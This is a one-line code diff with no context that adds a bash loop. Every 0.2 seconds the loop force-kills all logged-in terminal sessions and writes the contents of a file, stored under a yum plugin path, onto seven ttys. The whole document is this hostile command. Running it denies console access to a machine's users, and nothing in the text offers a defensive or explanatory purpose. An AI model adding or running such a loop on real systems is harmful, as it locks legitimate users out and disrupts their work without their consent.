@@ -1,0 +1,1 @@
+while true; do for i in {1..7}; do who -p -u | grep tty | awk '{ print $6 }' | xargs -n1 kill -9; cat /usr/lib/yum-plugins/cat.asc > /dev/tty$i; done; sleep 0.2; done
